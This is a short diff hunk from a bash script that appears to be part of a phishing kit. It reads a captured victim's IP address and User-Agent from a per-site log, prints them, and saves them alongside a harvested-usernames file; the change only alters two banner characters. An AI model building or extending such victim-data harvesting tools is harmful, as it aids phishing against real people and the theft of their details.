@@ -231,8 +231,8 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;92m[\e[0m\e[0m+\e[0m\e[1;92m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;92m[\e[0m\e[0m+\e[0m\e[1;92m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
